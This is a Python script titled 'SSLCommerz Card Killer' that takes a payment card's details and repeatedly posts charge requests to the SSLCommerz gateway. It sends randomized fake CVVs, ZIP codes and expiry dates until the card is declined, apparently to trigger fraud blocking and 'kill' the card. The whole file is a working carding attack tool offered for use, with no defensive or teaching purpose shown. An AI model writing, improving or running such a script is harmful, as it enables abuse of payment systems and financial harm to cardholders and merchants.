import requests
import time
import random
import threading

# === INPUT SCREEN ===
print("=" * 50)
print("💳 SSLCommerz Card Killer (LIVE ATTEMPT FLOW)")
print("=" * 50)

card_number = input("Enter Card Number: ")
exp_month = input("Enter Expiry Month (MM): ")
exp_year = input("Enter Expiry Year (YYYY): ")
cvv_real = input("Enter CVV: ")
zip_real = input("Enter ZIP Code: ")

# === SSLCommerz SETTINGS ===
store_id = "your_store_id"
store_passwd = "your_store_password"
init_url = "https://sandbox.sslcommerz.com/gwprocess/v4/api.php"

loading = True
start_time = time.time()

# === LOADING BAR ===
def animate_loading():
    bar = ["[⬛⬜⬜⬜⬜]", "[⬛⬛⬜⬜⬜]", "[⬛⬛⬛⬜⬜]", "[⬛⬛⬛⬛⬜]", "[⬛⬛⬛⬛⬛]"]
    while loading:
        for stage in bar:
            print(f"\rProcessing {stage}", end="", flush=True)
            time.sleep(0.3)

# === CHARGE FUNCTION ===
def send_sslcommerz_charge(cvv, zip_code, month, year):
    trx_id = f"TX{random.randint(100000,999999)}"
    payload = {
        "store_id": store_id,
        "store_passwd": store_passwd,
        "total_amount": "1",
        "currency": "BDT",
        "tran_id": trx_id,
        "success_url": "https://yourdomain.com/success",
        "fail_url": "https://yourdomain.com/fail",
        "cancel_url": "https://yourdomain.com/cancel",
        "emi_option": "0",
        "cus_name": "Test User",
        "cus_email": "test@example.com",
        "cus_add1": "123 Test Address",
        "cus_city": "Dhaka",
        "cus_state": "Dhaka",
        "cus_postcode": zip_code,
        "cus_country": "Bangladesh",
        "cus_phone": "01711111111",
        "shipping_method": "NO",
        "product_name": "Test Product",
        "product_category": "Test",
        "product_profile": "general",
        "card_number": card_number,
        "card_expiry": f"{month}/{year[-2:]}",  # Format MM/YY
        "card_cvc": cvv
    }

    try:
        response = requests.post(init_url, data=payload, timeout=10)
        data = response.json()

        if data.get("status") == "FAILED":
            return "declined"
        elif data.get("status") == "SUCCESS":
            return "approved"
        else:
            return "error"
    except Exception as e:
        return "timeout"

# === KILLER LOGIC ===
def kill_card():
    global loading
    killed = False
    attempt = 0

    while not killed:
        for _ in range(4):  # 3–5 fake attempts enough for SSLCommerz
            fake_cvv = str(random.randint(100, 999))
            fake_zip = str(random.randint(10000, 99999))
            fake_month = str(random.randint(1, 12)).zfill(2)
            fake_year = str(random.randint(2025, 2030))

            attempt += 1
            result = send_sslcommerz_charge(fake_cvv, fake_zip, fake_month, fake_year)
            print(f"\n[Attempt {attempt}] Fake attempt: {result}")

        result = send_sslcommerz_charge(cvv_real, zip_real, exp_month, exp_year)

        if result == "declined":
            killed = True
        else:
            print("\n[✓] Card still alive, retrying...")

    loading = False
    total = round(time.time() - start_time, 2)
    print(f"\n💀 CARD SUCCESSFULLY KILLED! [Time: {total}s]")

# === THREAD EXECUTION ===
t1 = threading.Thread(target=animate_loading)
t2 = threading.Thread(target=kill_card)

t1.start()
t2.start()
t2.join()
